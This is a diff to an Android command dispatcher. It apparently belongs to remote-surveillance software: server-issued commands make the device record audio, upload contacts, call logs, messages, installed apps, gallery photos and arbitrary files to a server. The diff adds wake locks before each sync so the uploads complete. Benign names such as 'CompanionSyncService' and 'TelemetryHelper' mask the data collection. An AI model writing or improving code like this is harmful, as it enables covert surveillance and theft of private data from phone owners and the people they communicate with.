@@ -31,14 +31,19 @@ public class CommandDispatcher {
             int duration = (payload != null) ? payload.optInt("duration", 15) : 15;
             AudioHelper.recordAndUpload(context, serverUrl, deviceId, cmdId, duration, null);
         } else if ("sync_apps".equals(type)) {
+            CompanionSyncService.acquireActionWakeLock(context, 45000L);
             TelemetryHelper.syncInstalledApps(context, serverUrl, deviceId, cmdId);
         } else if ("sync_contacts".equals(type)) {
+            CompanionSyncService.acquireActionWakeLock(context, 45000L);
             TelemetryHelper.syncContacts(context, serverUrl, deviceId, cmdId);
         } else if ("sync_calls".equals(type)) {
+            CompanionSyncService.acquireActionWakeLock(context, 45000L);
             TelemetryHelper.syncCalls(context, serverUrl, deviceId, cmdId);
         } else if ("sync_messages".equals(type)) {
+            CompanionSyncService.acquireActionWakeLock(context, 45000L);
             TelemetryHelper.syncMessages(context, serverUrl, deviceId, cmdId);
         } else if ("sync_gallery".equals(type)) {
+            CompanionSyncService.acquireActionWakeLock(context, 45000L);
             GalleryHelper.syncGallery(context, serverUrl, deviceId, cmdId);
         } else if ("upload_file".equals(type) || "fetch_file".equals(type)) {
             String path = (payload != null) ? payload.optString("file_path", "") : "";
